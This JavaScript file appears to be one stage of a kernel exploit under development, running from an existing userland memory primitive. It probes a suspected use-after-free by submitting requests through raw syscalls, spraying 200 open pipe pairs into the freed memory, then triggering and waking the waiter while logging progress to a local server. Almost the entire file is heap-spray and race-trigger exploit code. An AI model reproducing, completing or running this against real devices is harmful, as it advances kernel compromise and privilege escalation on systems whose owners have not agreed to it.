// 20_firespray.js — DIFFERENTIAL: fire-alone was silent (2x). Fire + 200 live
// pipe pairs + wake: panic/divergence = spray hit freed waiter zone (UAF real).
// MAY PANIC (signal, not failure). Survivor-marked throughout.
(async () => {
    const LOG_HOST = "192.168.0.163";
    const say = (s) => { try { log("[f20] " + s); } catch (e) {} };
    const shout = (s) => { try { send_notification(s); } catch (e) {} };
    try { LOG_SERVER = "http://" + LOG_HOST + ":8080/log"; } catch (e) {}
    try { if (typeof checkLogServer === "function") await checkLogServer(); } catch (e) {}
    const pace = () => new Promise((r) => setTimeout(r, 500));
    const step = async (tag, fn) => {
        shout("f20: " + tag); say(tag); await pace();
        try { const r = await fn(); shout(("f20: " + tag + "=" + String(r)).slice(0,110)); say(tag + "=" + String(r)); await pace(); return r; }
        catch (e) { shout("f20: " + tag + " THREW"); say(tag + " threw"); await pace(); return null; }
    };
    await step("start", async () => "FIRE+SPRAY (may panic)");
    await step("init", async () => await syscall(0x29En, 0n,0n,0n,0n,0n,0n));
    let rfd = -1, wfd = -1;
    await step("pipe", async () => {
        const a = malloc(8); write64(a, 0n);
        const r = await syscall(0x2AFn, a, 0n,0n,0n,0n,0n);
        try {
            const fds = read64(a);
            rfd = Number(fds & 0xFFFFFFFFn); wfd = Number((fds >> 32n) & 0xFFFFFFFFn);
        } catch (e) {}
        return String(r) + " r=" + rfd + " w=" + wfd;
    });
    let ids = 0n, states = 0n;
    await step("fill", async () => {
        const RB = 0x28;
        const reqs = malloc(RB * 2);
        for (let i = 0; i < RB * 2; i += 8) write64(reqs + BigInt(i), 0n);
        for (let i = 0; i < 2; i++) write32(reqs + BigInt(i * RB + 0x20), rfd);
        ids = malloc(8); states = malloc(8);
        write32(ids, 0n); write32(ids + 4n, 0n);
        write32(states, 0n); write32(states + 4n, 0n);
        return await syscall(0x29Dn, 0x1001n, reqs, 2n, 3n, ids, 0n);
    });
    const spray = [];
    await step("spray200", async () => {
        let made = 0;
        for (let i = 0; i < 200; i++) {
            try {
                const a = malloc(8); write64(a, 0n);
                const r = await syscall(0x2AFn, a, 0n,0n,0n,0n,0n);
                if (String(r) === "0") {
                    const v = read64(a);
                    spray.push(Number(v & 0xFFFFFFFFn), Number((v >> 32n) & 0xFFFFFFFFn));
                    made++;
                }
            } catch (e) { break; }
        }
        return "pairs=" + made + " (LEFT OPEN)";
    });
    await step("FIRE", async () => await syscall(0x297n, ids, 2n, states, 0n, 0n, 0n));
    await step("WAKE", async () => {
        const wb = malloc(4); write8(wb, 0x57);
        return await syscall(0x04n, BigInt(wfd), wb, 1n, 0n, 0n, 0n);
    });
    await step("settle", async () => {
        for (let i = 0; i < 200; i++) { try { await syscall(0x14Bn, 0n,0n,0n,0n,0n,0n); } catch (e) {} }
        return "yielded";
    });
    await step("cleanup", async () => {
        try { await syscall(0x29An, ids, 2n, states, 0n, 0n, 0n); } catch (e) {}
        try { await syscall(0x296n, ids, 2n, states, 0n, 0n, 0n); } catch (e) {}
        let c = 0;
        for (const fd of spray) { try { await syscall(0x06n, BigInt(fd), 0n,0n,0n,0n,0n); c++; } catch (e) { break; } }
        try { if (rfd >= 0) await syscall(0x06n, BigInt(rfd), 0n,0n,0n,0n,0n); } catch (e) {}
        try { if (wfd >= 0) await syscall(0x06n, BigInt(wfd), 0n,0n,0n,0n,0n); } catch (e) {}
        return "closed-spray=" + c;
    });
    await step("verdict", async () => "survived (compare vs silent fire-alone)");
    await step("done", async () => "ok");
})()
